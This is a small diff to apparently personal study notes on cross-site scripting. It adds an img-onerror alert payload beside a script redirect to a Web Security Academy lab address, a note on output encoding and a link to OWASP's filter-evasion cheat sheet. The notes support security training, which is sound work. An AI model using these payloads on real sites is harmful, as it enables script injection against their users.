@@ -27,6 +27,10 @@ https://site.com/search?q=
 - Setup output encoding to only return certain symbols
 # Uses
 - Evasion techniques: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+### Classic OnError
+```js
+<img src="x" onerror="alert('XSS')">
+```
 ### Redirect
 ```js
 <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
